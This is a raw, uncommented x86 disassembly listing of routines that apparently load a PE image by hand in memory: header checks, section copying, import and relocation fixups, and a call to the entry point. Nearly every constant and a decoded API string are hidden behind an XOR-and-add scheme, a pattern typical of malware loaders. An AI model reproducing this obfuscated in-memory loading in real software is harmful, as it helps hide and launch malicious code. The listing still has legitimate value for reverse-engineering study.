  421a7d:	mov    eax,DWORD PTR [ebp-0x4]
  421a80:	push   ebx
  421a81:	push   esi
  421a82:	mov    esi,0x75108b3
  421a87:	xor    eax,esi
  421a89:	push   edi
  421a8a:	mov    edi,0x3272fa
  421a8f:	add    eax,edi
  421a91:	mov    DWORD PTR [ebp-0x18],eax
  421a94:	mov    eax,DWORD PTR [ebp-0x4]
  421a97:	xor    eax,esi
  421a99:	add    eax,edi
  421a9b:	mov    DWORD PTR [ebp-0x8],eax
  421a9e:	mov    ebx,DWORD PTR [ebp+0x20]
  421aa1:	mov    eax,DWORD PTR [ebp-0x1c]
  421aa4:	mov    ecx,DWORD PTR [ebp-0x1c]
  421aa7:	xor    eax,ecx
  421aa9:	mov    DWORD PTR [ebp-0x1c],eax
  421aac:	add    DWORD PTR [ebp-0x1c],0xf89cb5b5
  421ab3:	mov    eax,DWORD PTR [ebp-0xc]
  421ab6:	mov    ecx,DWORD PTR [ebp-0xc]
  421ab9:	xor    eax,ecx
  421abb:	mov    DWORD PTR [ebp-0xc],eax
  421abe:	add    DWORD PTR [ebp-0xc],0xf89c85f5
  421ac5:	mov    eax,DWORD PTR [ebp-0x10]
  421ac8:	mov    ecx,DWORD PTR [ebp-0x10]
  421acb:	xor    eax,ecx
  421acd:	mov    DWORD PTR [ebp-0x10],eax
  421ad0:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  421ad7:	mov    eax,DWORD PTR [ebp-0x28]
  421ada:	mov    ecx,DWORD PTR [ebp-0x28]
  421add:	xor    eax,ecx
  421adf:	mov    DWORD PTR [ebp-0x28],eax
  421ae2:	add    DWORD PTR [ebp-0x28],0xf89f05b5
  421ae9:	mov    DWORD PTR [ebp+0x20],0xf89cefe0
  421af0:	mov    eax,DWORD PTR [ebp+0x8]
  421af3:	test   eax,eax
  421af5:	je     0x421f7c
  421afb:	mov    eax,DWORD PTR [ebp+0xc]
  421afe:	test   eax,eax
  421b00:	je     0x421f7c
  421b06:	mov    eax,DWORD PTR [ebp+0x18]
  421b09:	test   eax,eax
  421b0b:	je     0x421f7c
  421b11:	mov    eax,DWORD PTR [ebp+0x20]
  421b14:	mov    ecx,DWORD PTR [ebp+0x8]
  421b17:	xor    eax,0x8b3
  421b1c:	add    eax,0x72fa
  421b21:	cmp    WORD PTR [ecx],ax
  421b24:	jne    0x421f7c
  421b2a:	mov    eax,DWORD PTR [ebp-0x4]
  421b2d:	xor    eax,esi
  421b2f:	add    eax,edi
  421b31:	mov    DWORD PTR [ebp-0x30],eax
  421b34:	mov    eax,DWORD PTR [ebp-0x4]
  421b37:	mov    ecx,DWORD PTR [ebp+0x8]
  421b3a:	mov    eax,DWORD PTR [ebp+0x8]
  421b3d:	add    eax,DWORD PTR [ecx+0x3c]
  421b40:	mov    DWORD PTR [ebp+0xc],eax
  421b43:	mov    eax,DWORD PTR [eax+0x50]
  421b46:	test   eax,eax
  421b48:	je     0x421f7c
  421b4e:	mov    DWORD PTR [ebp-0x2c],0xf88c85b5
  421b55:	mov    eax,DWORD PTR [ebp-0x2c]
  421b58:	xor    eax,esi
  421b5a:	add    eax,edi
  421b5c:	mov    DWORD PTR [ebp-0x2c],eax
  421b5f:	mov    eax,DWORD PTR [ebp-0x4]
  421b62:	mov    eax,DWORD PTR [ebx+0x190]
  421b68:	mov    ecx,DWORD PTR [eax]
  421b6a:	mov    ecx,DWORD PTR [ecx+0x3c]
  421b6d:	add    ecx,DWORD PTR [eax]
  421b6f:	mov    eax,DWORD PTR [ebp-0x4]
  421b72:	mov    eax,DWORD PTR [ebx+0x18c]
  421b78:	mov    edx,DWORD PTR [eax]
  421b7a:	mov    DWORD PTR [ebp-0x20],ecx
  421b7d:	mov    DWORD PTR [ebp+0x20],edx
  421b80:	cmp    edx,edx
  421b82:	jne    0x421bb6
  421b84:	mov    eax,DWORD PTR [ebx+0x1e0]
  421b8a:	lea    edx,[ebp-0x18]
  421b8d:	push   edx
  421b8e:	mov    edx,DWORD PTR [ebp-0xc]
  421b91:	xor    edx,esi
  421b93:	add    edx,edi
  421b95:	push   edx
  421b96:	push   DWORD PTR [ecx+0x50]
  421b99:	push   DWORD PTR [ebp+0x20]
  421b9c:	call   DWORD PTR [eax+0x1c]
  421b9f:	mov    eax,DWORD PTR [ebp-0x20]
  421ba2:	mov    ecx,DWORD PTR [eax+0x54]
  421ba5:	mov    eax,DWORD PTR [eax+0x50]
  421ba8:	sub    eax,ecx
  421baa:	add    ecx,DWORD PTR [ebp+0x20]
  421bad:	push   ecx
  421bae:	call   0x422519
  421bb3:	mov    edx,DWORD PTR [ebp+0x20]
  421bb6:	mov    eax,DWORD PTR [ebx+0x194]
  421bbc:	mov    DWORD PTR [eax],edx
  421bbe:	mov    eax,DWORD PTR [ebp+0xc]
  421bc1:	push   DWORD PTR [eax+0x54]
  421bc4:	push   DWORD PTR [ebp+0x8]
  421bc7:	push   edx
  421bc8:	call   0x42240f
  421bcd:	mov    ecx,DWORD PTR [ebp+0x20]
  421bd0:	mov    eax,DWORD PTR [ecx+0x3c]
  421bd3:	add    eax,ecx
  421bd5:	movzx  ecx,WORD PTR [eax+0x14]
  421bd9:	lea    ecx,[ecx+eax*1+0x18]
  421bdd:	mov    DWORD PTR [ebp+0x18],ecx
  421be0:	mov    ecx,DWORD PTR [ebp-0x4]
  421be3:	movzx  edx,WORD PTR [eax+0x6]
  421be7:	xor    ecx,esi
  421be9:	add    ecx,edi
  421beb:	mov    DWORD PTR [ebp+0xc],eax
  421bee:	cmp    edx,ecx
  421bf0:	je     0x421c9d
  421bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  421bf9:	xor    ecx,esi
  421bfb:	add    ecx,edi
  421bfd:	mov    DWORD PTR [ebp-0x8],ecx
  421c00:	mov    ecx,DWORD PTR [ebp-0x24]
  421c03:	movzx  edx,WORD PTR [eax+0x6]
  421c07:	xor    ecx,esi
  421c09:	sub    edx,ecx
  421c0b:	sub    edx,edi
  421c0d:	cmp    DWORD PTR [ebp-0x8],edx
  421c10:	ja     0x421c9d
  421c16:	mov    edx,DWORD PTR [ebp+0x18]
  421c19:	add    edx,0x8
  421c1c:	mov    DWORD PTR [ebp+0x18],edx
  421c1f:	jmp    0x421c24
  421c21:	mov    edx,DWORD PTR [ebp+0x18]
  421c24:	mov    eax,DWORD PTR [eax+0x38]
  421c27:	lea    ecx,[eax-0x1]
  421c2a:	mov    DWORD PTR [ebp-0x38],eax
  421c2d:	mov    eax,DWORD PTR [edx]
  421c2f:	test   eax,ecx
  421c31:	je     0x421c3a
  421c33:	not    ecx
  421c35:	and    eax,ecx
  421c37:	add    eax,DWORD PTR [ebp-0x38]
  421c3a:	mov    ecx,DWORD PTR [edx+0x4]
  421c3d:	add    ecx,DWORD PTR [ebp+0x20]
  421c40:	push   ecx
  421c41:	call   0x422519
  421c46:	mov    edx,DWORD PTR [ebp-0x4]
  421c49:	mov    eax,DWORD PTR [ebp+0x18]
  421c4c:	mov    ecx,DWORD PTR [eax+0x8]
  421c4f:	xor    edx,esi
  421c51:	add    edx,edi
  421c53:	cmp    ecx,edx
  421c55:	je     0x421c6e
  421c57:	push   ecx
  421c58:	mov    ecx,DWORD PTR [ebp+0x8]
  421c5b:	add    ecx,DWORD PTR [eax+0xc]
  421c5e:	mov    eax,DWORD PTR [eax+0x4]
  421c61:	add    eax,DWORD PTR [ebp+0x20]
  421c64:	push   ecx
  421c65:	push   eax
  421c66:	call   0x42240f
  421c6b:	mov    eax,DWORD PTR [ebp+0x18]
  421c6e:	mov    ecx,DWORD PTR [ebp-0x24]
  421c71:	mov    edx,DWORD PTR [ebp-0x8]
  421c74:	add    eax,0x28
  421c77:	xor    ecx,esi
  421c79:	lea    ecx,[edx+ecx*1+0x3272fa]
  421c80:	mov    edx,DWORD PTR [ebp+0xc]
  421c83:	mov    DWORD PTR [ebp+0x18],eax
  421c86:	mov    eax,DWORD PTR [ebp-0x24]
  421c89:	movzx  edx,WORD PTR [edx+0x6]
  421c8d:	xor    eax,esi
  421c8f:	sub    edx,eax
  421c91:	mov    eax,DWORD PTR [ebp+0xc]
  421c94:	sub    edx,edi
  421c96:	mov    DWORD PTR [ebp-0x8],ecx
  421c99:	cmp    ecx,edx
  421c9b:	jbe    0x421c21
  421c9d:	mov    edx,DWORD PTR [ebx+0x18c]
  421ca3:	mov    ecx,DWORD PTR [ebp+0x20]
  421ca6:	cmp    ecx,DWORD PTR [edx]
  421ca8:	jne    0x421cd1
  421caa:	mov    eax,DWORD PTR [ebx+0x1e0]
  421cb0:	lea    edx,[ebp-0x18]
  421cb3:	push   edx
  421cb4:	mov    edx,DWORD PTR [ebp-0x10]
  421cb7:	xor    edx,esi
  421cb9:	add    edx,edi
  421cbb:	push   edx
  421cbc:	mov    edx,DWORD PTR [ebp-0x20]
  421cbf:	push   DWORD PTR [edx+0x54]
  421cc2:	push   ecx
  421cc3:	call   DWORD PTR [eax+0x1c]
  421cc6:	test   eax,eax
  421cc8:	je     0x421f6d
  421cce:	mov    eax,DWORD PTR [ebp+0xc]
  421cd1:	mov    ecx,DWORD PTR [ebx+0x1c8]
  421cd7:	mov    ecx,DWORD PTR [ecx]
  421cd9:	xor    ecx,esi
  421cdb:	add    ecx,edi
  421cdd:	je     0x421e98
  421ce3:	mov    eax,DWORD PTR [ebp-0x4]
  421ce6:	xor    eax,esi
  421ce8:	add    eax,edi
  421cea:	and    DWORD PTR [ebp+0x8],0x0
  421cee:	mov    DWORD PTR [ebp-0x14],eax
  421cf1:	mov    eax,0xf89c85d9
  421cf6:	lea    ecx,[eax-0x18]
  421cf9:	mov    DWORD PTR [ebp-0x58],0xf89c85c7
  421d00:	mov    DWORD PTR [ebp-0x54],0xf89c85c9
  421d07:	mov    DWORD PTR [ebp-0x50],eax
  421d0a:	mov    DWORD PTR [ebp-0x4c],ecx
  421d0d:	mov    DWORD PTR [ebp-0x48],ecx
  421d10:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  421d17:	mov    edx,DWORD PTR [ebp+0x8]
  421d1a:	mov    ecx,0x8b3
  421d1f:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  421d24:	mov    edx,0x72fa
  421d29:	add    cx,dx
  421d2c:	mov    edx,DWORD PTR [ebp+0x8]
  421d2f:	inc    DWORD PTR [ebp+0x8]
  421d32:	cmp    DWORD PTR [ebp+0x8],0x6
  421d36:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  421d3e:	jb     0x421d17
  421d40:	mov    ecx,0xf89c85cb
  421d45:	mov    DWORD PTR [ebp-0xb0],eax
  421d4b:	mov    DWORD PTR [ebp-0x9c],eax
  421d51:	mov    DWORD PTR [ebp-0x74],eax
  421d54:	mov    DWORD PTR [ebp-0x70],eax
  421d57:	lea    eax,[ecx-0x1]
  421d5a:	lea    edx,[ecx+0x34]
  421d5d:	mov    DWORD PTR [ebp-0x64],eax
  421d60:	mov    DWORD PTR [ebp-0x60],eax
  421d63:	mov    DWORD PTR [ebp-0xb4],0xf89c85e1
  421d6d:	mov    DWORD PTR [ebp-0xac],ecx
  421d73:	mov    DWORD PTR [ebp-0xa8],edx
  421d79:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  421d83:	mov    DWORD PTR [ebp-0xa0],0xf89c85c7
  421d8d:	mov    DWORD PTR [ebp-0x98],0xf89c85f8
  421d97:	mov    DWORD PTR [ebp-0x94],0xf89c85c7
  421da1:	mov    DWORD PTR [ebp-0x90],0xf89c85c9
  421dab:	mov    DWORD PTR [ebp-0x8c],ecx
  421db1:	mov    DWORD PTR [ebp-0x88],0xf89c85cc
  421dbb:	mov    DWORD PTR [ebp-0x84],edx
  421dc1:	mov    DWORD PTR [ebp-0x80],0xf89c85c6
  421dc8:	mov    DWORD PTR [ebp-0x7c],ecx
  421dcb:	mov    DWORD PTR [ebp-0x78],0xf89c85f4
  421dd2:	mov    DWORD PTR [ebp-0x6c],ecx
  421dd5:	mov    DWORD PTR [ebp-0x68],0xf89c85d8
  421ddc:	mov    DWORD PTR [ebp-0x5c],0xf89c85b5
  421de3:	xor    eax,eax
  421de5:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  421dec:	xor    cl,0xb3
  421def:	sub    cl,0x6
  421df2:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  421df9:	inc    eax
  421dfa:	cmp    eax,0x17
  421dfd:	jb     0x421de5
  421dff:	mov    eax,DWORD PTR [ebx+0x1e0]
  421e05:	lea    ecx,[ebp-0xc0]
  421e0b:	push   ecx
  421e0c:	call   DWORD PTR [eax+0x4]
  421e0f:	mov    ecx,DWORD PTR [ebx+0x1e0]
  421e15:	lea    edx,[ebp-0xd8]
  421e1b:	push   edx
  421e1c:	push   eax
  421e1d:	call   DWORD PTR [ecx+0x8]
  421e20:	mov    DWORD PTR [ebp-0x40],eax
  421e23:	lea    eax,[ebp-0x14]
  421e26:	push   eax
  421e27:	mov    eax,DWORD PTR [ebx+0x18c]
  421e2d:	push   DWORD PTR [eax]
  421e2f:	mov    eax,DWORD PTR [ebp-0x40]
  421e32:	call   eax
  421e34:	mov    eax,DWORD PTR [ebp-0x4]
  421e37:	xor    eax,esi
  421e39:	add    eax,edi
  421e3b:	mov    DWORD PTR [ebp-0x34],eax
  421e3e:	mov    ecx,DWORD PTR [ebp-0x4]
  421e41:	mov    eax,DWORD PTR [ebp-0x14]
  421e44:	xor    ecx,esi
  421e46:	add    ecx,edi
  421e48:	cmp    eax,ecx
  421e4a:	je     0x421e95
  421e4c:	mov    DWORD PTR [ebp-0x3c],eax
  421e4f:	jmp    0x421e60
  421e51:	mov    eax,DWORD PTR [eax]
  421e53:	mov    ecx,DWORD PTR [ebp-0x3c]
  421e56:	mov    DWORD PTR [ebp-0x14],eax
  421e59:	mov    eax,DWORD PTR [ebp-0x14]
  421e5c:	cmp    eax,ecx
  421e5e:	je     0x421e6d
  421e60:	mov    edx,DWORD PTR [eax+0x18]
  421e63:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e69:	cmp    edx,DWORD PTR [ecx]
  421e6b:	jne    0x421e51
  421e6d:	mov    ecx,DWORD PTR [ebx+0x18c]
  421e73:	mov    edx,DWORD PTR [eax+0x18]
  421e76:	cmp    edx,DWORD PTR [ecx]
  421e78:	jne    0x421e95
  421e7a:	mov    ecx,DWORD PTR [ebx+0x190]
  421e80:	mov    edx,DWORD PTR [ebp-0x20]
  421e83:	mov    edx,DWORD PTR [edx+0x28]
  421e86:	add    edx,DWORD PTR [ecx]
  421e88:	mov    DWORD PTR [eax+0x1c],edx
  421e8b:	mov    eax,DWORD PTR [ebp-0x24]
  421e8e:	xor    eax,esi
  421e90:	add    eax,edi
  421e92:	mov    DWORD PTR [ebp-0x34],eax
  421e95:	mov    eax,DWORD PTR [ebp+0xc]
  421e98:	push   ebx
  421e99:	push   eax
  421e9a:	push   DWORD PTR [ebp+0x20]
  421e9d:	call   0x42161d
  421ea2:	test   eax,eax
  421ea4:	je     0x421f6d
  421eaa:	push   DWORD PTR [ebp+0xc]
  421ead:	mov    ecx,ebx
  421eaf:	push   DWORD PTR [ebp+0x20]
  421eb2:	call   0x421576
  421eb7:	test   eax,eax
  421eb9:	je     0x421f6d
  421ebf:	mov    eax,DWORD PTR [ebp+0xc]
  421ec2:	mov    edx,DWORD PTR [ebp+0x20]
  421ec5:	mov    ecx,ebx
  421ec7:	call   0x42144f
  421ecc:	test   eax,eax
  421ece:	je     0x421f6d
  421ed4:	push   ebx
  421ed5:	push   DWORD PTR [ebp+0x20]
  421ed8:	call   0x421900
  421edd:	test   eax,eax
  421edf:	je     0x421f6d
  421ee5:	mov    eax,DWORD PTR [ebx+0x18c]
  421eeb:	mov    edx,DWORD PTR [ebp+0x20]
  421eee:	cmp    edx,DWORD PTR [eax]
  421ef0:	jne    0x421f0c
  421ef2:	mov    eax,DWORD PTR [ebx+0x1e0]
  421ef8:	lea    ecx,[ebp-0x18]
  421efb:	push   ecx
  421efc:	push   DWORD PTR [ebp-0x18]
  421eff:	mov    ecx,DWORD PTR [ebp-0x20]
  421f02:	push   DWORD PTR [ecx+0x54]
  421f05:	push   edx
  421f06:	call   DWORD PTR [eax+0x1c]
  421f09:	mov    edx,DWORD PTR [ebp+0x20]
  421f0c:	mov    eax,DWORD PTR [ebx+0x1c8]
  421f12:	mov    eax,DWORD PTR [eax]
  421f14:	xor    eax,esi
  421f16:	add    eax,edi
  421f18:	je     0x421f51
  421f1a:	mov    ecx,DWORD PTR [ebp+0xc]
  421f1d:	mov    eax,DWORD PTR [ecx+0x28]
  421f20:	mov    DWORD PTR [ebp+0x8],0xf89ca5b5
  421f27:	mov    esi,DWORD PTR [ebp+0x8]
  421f2a:	push   DWORD PTR [ebp+0x14]
  421f2d:	xor    esi,0x8b3
  421f33:	push   DWORD PTR [ebp+0x10]
  421f36:	add    esi,0x72fa
  421f3c:	or     WORD PTR [ecx+0x16],si
  421f40:	add    eax,edx
  421f42:	push   edx
  421f43:	call   eax
  421f45:	mov    DWORD PTR [ebx+0x1d0],0xf89c85b4
  421f4f:	jmp    0x421f5b
  421f51:	mov    eax,DWORD PTR [ebp+0xc]
  421f54:	mov    eax,DWORD PTR [eax+0x28]
  421f57:	add    eax,edx
  421f59:	call   eax
  421f5b:	mov    DWORD PTR [ebp-0x8],eax
  421f5e:	mov    eax,DWORD PTR [ebp-0x8]
  421f61:	mov    ecx,DWORD PTR [ebp+0x1c]
  421f64:	mov    DWORD PTR [ecx],eax
  421f66:	mov    DWORD PTR [ebp-0x30],0x1
  421f6d:	cmp    DWORD PTR [ebp-0x30],0x0
  421f71:	jne    0x421f77
  421f73:	and    DWORD PTR [ebp+0x20],0x0
  421f77:	mov    eax,DWORD PTR [ebp+0x20]
  421f7a:	jmp    0x421f7e
  421f7c:	xor    eax,eax
  421f7e:	pop    edi
  421f7f:	pop    esi
  421f80:	pop    ebx
  421f81:	leave  
  421f82:	ret    0x1c
  421f85:	push   ebp
  421f86:	mov    ebp,esp
  421f88:	movzx  edx,WORD PTR [ecx+0x6]
  421f8c:	movzx  eax,WORD PTR [ecx+0x14]
  421f90:	push   ebx
  421f91:	push   edi
  421f92:	xor    edi,edi
  421f94:	lea    eax,[eax+ecx*1+0x18]
  421f98:	test   edx,edx
  421f9a:	je     0x421fbb
  421f9c:	mov    ecx,DWORD PTR [eax+0xc]
  421f9f:	lea    ebx,[ecx+esi*1]
  421fa2:	cmp    DWORD PTR [ebp+0x8],ebx
  421fa5:	jb     0x421fb3
  421fa7:	mov    ebx,DWORD PTR [eax+0x8]
  421faa:	add    ebx,ecx
  421fac:	add    ebx,esi
  421fae:	cmp    DWORD PTR [ebp+0x8],ebx
  421fb1:	jb     0x421fbd
  421fb3:	add    eax,0x28
  421fb6:	inc    edi
  421fb7:	cmp    edi,edx
  421fb9:	jb     0x421f9c
  421fbb:	xor    eax,eax
  421fbd:	pop    edi
  421fbe:	pop    ebx
  421fbf:	pop    ebp
  421fc0:	ret    0x4
  421fc3:	push   ebp
  421fc4:	mov    ebp,esp
  421fc6:	sub    esp,0x34
  421fc9:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  421fd0:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  421fd7:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  421fde:	mov    DWORD PTR [ebp-0x8],0xf89c85d4
  421fe5:	mov    DWORD PTR [ebp-0x20],0xf89c85f4
  421fec:	mov    DWORD PTR [ebp-0x2c],0xf89c8533
  421ff3:	mov    DWORD PTR [ebp-0x2c],0xf89c85d3
  421ffa:	mov    DWORD PTR [ebp-0x10],eax
  421ffd:	mov    eax,DWORD PTR [ebp+0x8]
  422000:	mov    DWORD PTR [ebp-0x14],eax
  422003:	mov    eax,DWORD PTR [ebp-0xc]
  422006:	push   ebx
  422007:	mov    ecx,0x75108b3
  42200c:	xor    eax,ecx
  42200e:	push   esi
  42200f:	mov    esi,DWORD PTR [ebp-0x10]
  422012:	mov    edx,0x3272fa
  422017:	add    eax,edx
  422019:	push   edi
  42201a:	cmp    esi,eax
  42201c:	je     0x4221fb
  422022:	mov    eax,DWORD PTR [ebp-0xc]
  422025:	mov    esi,DWORD PTR [ebp-0x14]
  422028:	xor    eax,ecx
  42202a:	add    eax,edx
  42202c:	cmp    esi,eax
  42202e:	je     0x4221fb
  422034:	mov    eax,DWORD PTR [ebp-0xc]
  422037:	xor    eax,ecx
  422039:	add    eax,edx
  42203b:	mov    DWORD PTR [ebp-0x24],eax
  42203e:	mov    eax,DWORD PTR [ebp-0xc]
  422041:	xor    eax,ecx
  422043:	add    eax,edx
  422045:	mov    DWORD PTR [ebp-0x28],eax
  422048:	mov    edi,DWORD PTR [ebp-0x20]
  42204b:	mov    ebx,DWORD PTR [ebp-0x8]
  42204e:	mov    esi,0x8b3
  422053:	xor    edi,esi
  422055:	mov    eax,0x72fa
  42205a:	xor    ebx,esi
  42205c:	add    edi,eax
  42205e:	add    ebx,eax
  422060:	sub    ebx,edi
  422062:	mov    WORD PTR [ebp-0x8],bx
  422066:	jmp    0x42212b
  42206b:	mov    edi,DWORD PTR [ebp-0xc]
  42206e:	mov    bx,WORD PTR [ebp-0x4]
  422072:	xor    edi,esi
  422074:	add    edi,eax
  422076:	cmp    bx,di
  422079:	je     0x42216d
  42207f:	mov    edi,DWORD PTR [ebp-0xc]
  422082:	mov    ebx,DWORD PTR [ebp+0xc]
  422085:	xor    edi,ecx
  422087:	add    edi,edx
  422089:	cmp    ebx,edi
  42208b:	mov    di,WORD PTR [ebp-0x4]
  42208f:	mov    bx,WORD PTR [ebp+0x8]
  422093:	je     0x4220fe
  422095:	cmp    bx,di
  422098:	je     0x422107
  42209a:	mov    edi,DWORD PTR [ebp-0x20]
  42209d:	mov    bx,WORD PTR [ebp+0x8]
  4220a1:	xor    edi,esi
  4220a3:	add    edi,eax
  4220a5:	cmp    bx,di
  4220a8:	jb     0x4220c8
  4220aa:	mov    edi,DWORD PTR [ebp-0x2c]
  4220ad:	mov    bx,WORD PTR [ebp+0x8]
  4220b1:	xor    edi,esi
  4220b3:	add    edi,eax
  4220b5:	cmp    bx,di
  4220b8:	ja     0x4220c8
  4220ba:	movzx  edi,WORD PTR [ebp+0x8]
  4220be:	movzx  ebx,WORD PTR [ebp-0x8]
  4220c2:	add    edi,ebx
  4220c4:	mov    WORD PTR [ebp+0x8],di
  4220c8:	mov    edi,DWORD PTR [ebp-0x20]
  4220cb:	mov    bx,WORD PTR [ebp-0x4]
  4220cf:	xor    edi,esi
  4220d1:	add    edi,eax
  4220d3:	cmp    bx,di
  4220d6:	jb     0x4220f6
  4220d8:	mov    edi,DWORD PTR [ebp-0x2c]
  4220db:	mov    bx,WORD PTR [ebp-0x4]
  4220df:	xor    edi,esi
  4220e1:	add    edi,eax
  4220e3:	cmp    bx,di
  4220e6:	ja     0x4220f6
  4220e8:	movzx  edi,WORD PTR [ebp-0x4]
  4220ec:	movzx  ebx,WORD PTR [ebp-0x8]
  4220f0:	add    edi,ebx
  4220f2:	mov    WORD PTR [ebp-0x4],di
  4220f6:	mov    di,WORD PTR [ebp-0x4]
  4220fa:	mov    bx,WORD PTR [ebp+0x8]
  4220fe:	cmp    bx,di
  422101:	jne    0x4221fb
  422107:	mov    edi,DWORD PTR [ebp-0x1c]
  42210a:	mov    ebx,DWORD PTR [ebp-0x10]
  42210d:	xor    edi,ecx
  42210f:	lea    edi,[edi+ebx*1+0x3272fa]
  422116:	mov    DWORD PTR [ebp-0x10],edi
  422119:	mov    edi,DWORD PTR [ebp-0x1c]
  42211c:	mov    ebx,DWORD PTR [ebp-0x14]
  42211f:	xor    edi,ecx
  422121:	lea    edi,[edi+ebx*1+0x3272fa]
  422128:	mov    DWORD PTR [ebp-0x14],edi
  42212b:	mov    edi,DWORD PTR [ebp-0x24]
  42212e:	mov    ebx,DWORD PTR [ebp-0x10]
  422131:	mov    di,WORD PTR [ebx+edi*2]
  422135:	mov    WORD PTR [ebp+0x8],di
  422139:	mov    edi,DWORD PTR [ebp-0x28]
  42213c:	mov    ebx,DWORD PTR [ebp-0x14]
  42213f:	mov    di,WORD PTR [ebx+edi*2]
  422143:	mov    WORD PTR [ebp-0x4],di
  422147:	mov    edi,DWORD PTR [ebp-0xc]
  42214a:	mov    bx,WORD PTR [ebp+0x8]
  42214e:	xor    edi,esi
  422150:	add    edi,eax
  422152:	cmp    bx,di
  422155:	jne    0x42206b
  42215b:	mov    eax,DWORD PTR [ebp-0x18]
  42215e:	mov    esi,DWORD PTR [ebp-0xc]
  422161:	xor    eax,ecx
  422163:	add    eax,edx
  422165:	imul   eax,esi
  422168:	mov    DWORD PTR [ebp-0xc],eax
  42216b:	jmp    0x42217f
  42216d:	mov    eax,DWORD PTR [ebp-0xc]
  422170:	mov    esi,DWORD PTR [ebp-0x18]
  422173:	xor    eax,ecx
  422175:	lea    eax,[eax+esi*1+0x3272fa]
  42217c:	mov    DWORD PTR [ebp-0x18],eax
  42217f:	mov    eax,DWORD PTR [ebp-0x24]
  422182:	sub    eax,edx
  422184:	xor    eax,ecx
  422186:	mov    DWORD PTR [ebp-0x30],eax
  422189:	mov    eax,DWORD PTR [ebp-0x28]
  42218c:	sub    eax,edx
  42218e:	xor    eax,ecx
  422190:	mov    DWORD PTR [ebp-0x34],eax
  422193:	mov    eax,DWORD PTR [ebp-0x34]
  422196:	mov    esi,DWORD PTR [ebp-0x1c]
  422199:	xor    esi,ecx
  42219b:	add    esi,edx
  42219d:	xor    eax,ecx
  42219f:	add    eax,0x3272fa
  4221a4:	imul   esi,eax
  4221a7:	mov    eax,DWORD PTR [ebp-0x14]
  4221aa:	movzx  eax,WORD PTR [esi+eax*1]
  4221ae:	mov    esi,DWORD PTR [ebp-0x30]
  4221b1:	mov    edi,DWORD PTR [ebp-0x1c]
  4221b4:	xor    esi,ecx
  4221b6:	add    esi,edx
  4221b8:	xor    edi,ecx
  4221ba:	add    edi,edx
  4221bc:	imul   edi,esi
  4221bf:	mov    esi,DWORD PTR [ebp-0x10]
  4221c2:	movzx  esi,WORD PTR [edi+esi*1]
  4221c6:	sub    eax,edx
  4221c8:	sub    esi,edx
  4221ca:	xor    eax,ecx
  4221cc:	xor    esi,ecx
  4221ce:	cmp    esi,eax
  4221d0:	jne    0x4221fb
  4221d2:	mov    eax,DWORD PTR [ebp-0x30]
  4221d5:	mov    esi,DWORD PTR [ebp-0x1c]
  4221d8:	xor    eax,ecx
  4221da:	add    eax,0x3272fa
  4221df:	xor    esi,ecx
  4221e1:	add    esi,edx
  4221e3:	imul   esi,eax
  4221e6:	mov    eax,DWORD PTR [ebp-0x10]
  4221e9:	movzx  eax,WORD PTR [esi+eax*1]
  4221ed:	mov    esi,DWORD PTR [ebp-0xc]
  4221f0:	sub    eax,edx
  4221f2:	xor    eax,ecx
  4221f4:	cmp    eax,esi
  4221f6:	mov    eax,DWORD PTR [ebp-0xc]
  4221f9:	je     0x4221fe
  4221fb:	mov    eax,DWORD PTR [ebp-0x18]
  4221fe:	pop    edi
  4221ff:	xor    eax,ecx
  422201:	pop    esi
  422202:	add    eax,edx
  422204:	pop    ebx
  422205:	leave  
  422206:	ret    0x8
  422209:	push   ebp
  42220a:	mov    ebp,esp
  42220c:	push   ecx
  42220d:	mov    cx,WORD PTR [eax]
  422210:	push   esi
  422211:	mov    esi,0x3b5f
  422216:	sub    cx,si
  422219:	mov    esi,0x8a9d
  42221e:	xor    cx,si
  422221:	mov    esi,0x4e3c
  422226:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  42222d:	mov    edx,0xf89c85b5
  422232:	cmp    cx,si
  422235:	je     0x422294
  422237:	push   ebx
  422238:	push   edi
  422239:	movzx  ecx,cx
  42223c:	mov    edi,0xffcd8d06
  422241:	mov    esi,0x75108b3
  422246:	mov    ebx,0x4e60
  42224b:	cmp    cx,bx
  42224e:	jne    0x422253
  422250:	mov    DWORD PTR [ebp-0x4],edx
  422253:	lea    edx,[edi+0x1]
  422256:	xor    edx,esi
  422258:	mov    edi,edx
  42225a:	xor    edi,esi
  42225c:	mov    cx,WORD PTR [eax+edi*2+0x64e5f4]
  422264:	mov    ebx,0x3b5f
  422269:	sub    cx,bx
  42226c:	mov    ebx,0x8a9d
  422271:	xor    cx,bx
  422274:	mov    ebx,0x4e3c
  422279:	cmp    cx,bx
  42227c:	jne    0x422246
  42227e:	mov    ecx,DWORD PTR [ebp-0x4]
  422281:	pop    edi
  422282:	pop    ebx
  422283:	cmp    ecx,0xf89c85b6
  422289:	je     0x422294
  42228b:	xor    ecx,esi
  42228d:	lea    eax,[eax+ecx*2+0x64e5f6]
  422294:	pop    esi
  422295:	leave  
  422296:	ret    
  422297:	push   ebp
  422298:	mov    ebp,esp
  42229a:	push   ecx
  42229b:	push   esi
  42229c:	push   edi
  42229d:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  4222a4:	mov    esi,0xf89c85b5
  4222a9:	call   0x422209
  4222ae:	mov    edi,eax
  4222b0:	mov    al,BYTE PTR [edi]
  4222b2:	sub    al,0x6
  4222b4:	xor    al,0x81
  4222b6:	cmp    al,0x7b
  4222b8:	je     0x42231b
  4222ba:	mov    eax,edi
  4222bc:	mov    edx,0xffcd8d06
  4222c1:	mov    ecx,0x75108b3
  4222c6:	push   ebx
  4222c7:	mov    ax,WORD PTR [eax]
  4222ca:	mov    ebx,0x3b5f
  4222cf:	sub    ax,bx
  4222d2:	mov    ebx,0x8a9d
  4222d7:	xor    ax,bx
  4222da:	mov    ebx,0x4e52
  4222df:	cmp    ax,bx
  4222e2:	jne    0x4222e7
  4222e4:	mov    DWORD PTR [ebp-0x4],esi
  4222e7:	lea    esi,[edx+0x1]
  4222ea:	xor    esi,ecx
  4222ec:	mov    edx,esi
